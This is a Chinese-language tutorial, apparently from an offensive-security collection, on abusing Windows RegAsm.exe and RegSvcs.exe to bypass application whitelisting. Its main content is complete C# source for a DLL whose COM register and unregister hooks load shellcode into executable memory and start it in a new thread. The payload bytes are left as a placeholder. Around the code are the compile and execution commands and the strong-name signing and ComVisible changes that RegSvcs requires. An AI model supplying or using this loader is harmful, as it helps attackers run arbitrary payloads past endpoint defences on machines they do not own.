# 白名单-RegAsm/RegSvcs的利用

## 简介

RegAsm读取程序集中的元数据，并将所需项添加到注册表中。注册表允许 COM 客户端以透明方式创建 .NET Framework 类。在注册一个类之后，任何 COM 客户端都可以像使用 COM 类一样使用它。类仅在安装程序集时注册一次。只有实际注册程序集中的类实例之后才能从 COM 中创建它们。  
.NET 服务安装工具RegSvcs执行下列操作：

*   加载并注册程序集。
    
*   生成、注册类型库并将其安装到指定的 COM+ 应用程序中。
    
*   配置以编程方式添加到类的服务。
    

因为同样是没有添加到PATH中，需要给上绝对路径。  
win7为例：***C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319***  
具体的一些介绍信息可以查看官方手册。  
https://docs.microsoft.com/zh-cn/dotnet/framework/tools/regasm-exe-assembly-registration-tool  
https://docs.microsoft.com/zh-cn/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool

### RegAsm测试

跟前面的InstallUtil有点像，只是文件代码需要改下，且要编译成dll文件。

```
1.  `using System;`
    
2.  `using System.IO;`
    
3.  `using System.Collections.Generic;`
    
4.  `using System.Text;`
    
5.  `using System.Threading.Tasks;`
    
6.  `using System.EnterpriseService;`
    
7.  `using System.Runtime.InteropServices;`
    
8.  
    
9.  
    
10.  `namespace sdwjSJdn`
     
11.  `{`
     
12.  
     
13.  `    public class sSDMWo:ServicedComponent`
     
14.  `    {`
     
15.  `        public  void SDnqsdS()`
     
16.  `        {`
     
17.  `            Console.WriteLine("test");`
     
18.  `        }`
     
19.  `        [ComRegisterFunction]`
     
20.  `        public static void RegisterClass(string SDJLNWdws)`
     
21.  `        {`
     
22.  `        shellcodeload.MsdwsdSAsdw();`
     
23.  `        }`
     
24.  `        [ComUnregisterFunction]`
     
25.  `        public static void UnRegisterClass(string SDJLNWdws)`
     
26.  `        {`
     
27.  `        shellcodeload.MsdwsdSAsdw();`
     
28.  `        }`
     
29.  `    public class shellcodeload`
     
30.  `    {`
     
31.  `        public static void MsdwsdSAsdw()`
     
32.  `        {`
     
33.  `            byte[] shellcode = new byte[] { .......... }; //添加要加载的shellcode`
     
34.  
     
35.  `            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);`
     
36.  `            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);`
     
37.  `            IntPtr hThread = IntPtr.Zero;`
     
38.  `            UInt32 threadId = 0;`
     
39.  
     
40.  `            // Prepare data`
     
41.  `            IntPtr pinfo = IntPtr.Zero;`
     
42.  
     
43.  `            // Invoke the shellcode`
     
44.  `            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);`
     
45.  `            WaitForSingleObject(hThread, 0xFFFFFFFF);`
     
46.  `            return;`
     
47.  `        }`
     
48.  
     
49.  `        private static UInt32 MEM_COMMIT = 0x1000;`
     
50.  `        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;`
     
51.  
     
52.  `        [DllImport("kernel32")]`
     
53.  `        private static extern UInt32 VirtualAlloc(`
     
54.  `            UInt32 lpStartAddr,`
     
55.  `            UInt32 size,`
     
56.  `            UInt32 flAllocationType,`
     
57.  `            UInt32 flProtect`
     
58.  `        );`
     
59.  
     
60.  `        [DllImport("kernel32")]`
     
61.  `        private static extern IntPtr CreateThread(`
     
62.  `            UInt32 lpThreadAttributes,`
     
63.  `            UInt32 dwStackSize,`
     
64.  `            UInt32 lpStartAddress,`
     
65.  `            IntPtr param,`
     
66.  `            UInt32 dwCreationFlags,`
     
67.  `            ref UInt32 lpThreadId`
     
68.  `        );`
     
69.  
     
70.  `        [DllImport("kernel32")]`
     
71.  `        private static extern UInt32 WaitForSingleObject(`
     
72.  `            IntPtr hHandle,`
     
73.  `            UInt32 dwMilliseconds`
     
74.  `        );`
     
75.  `    }`
     
76.  `}`
     
```

然后直接编译：

```
1.  `csc.exe /target:library /out:test.dll 1.cs`
    
```

建议将得到的dll放到.net目录下，然后执行。

```
1.  `RegAsm.exe /U test.dll`
    
```

### RegSvcs测试  

代码还是用上面的代码，但是两个问题，一个是要给dll签名，一个是要修改一个配置。  
创建强名称密钥文件：  
打开开发人员命令提示。  
像下面一样创建密钥文件。  
![](../Images/a93aa5098082186e8fabfae4d045ae5d.png)

然后在项目属性中添加这个文件。  
![](../Images/7238e745d872f99e9d772cdc522bfe09.png)

这样编译还是不能运行，会报类错误的。  
修改项目中的AssemblyInfo.cs文件，将\[assembly: ComVisible(false)\]改为true。  
![](../Images/74a2bfa92f5f12e1c19163ab322ee1c0.png)

然后编译成dll文件。  
放到.net目录下执行。

```
1.  `RegSvcs.exe test.dll`
    
```
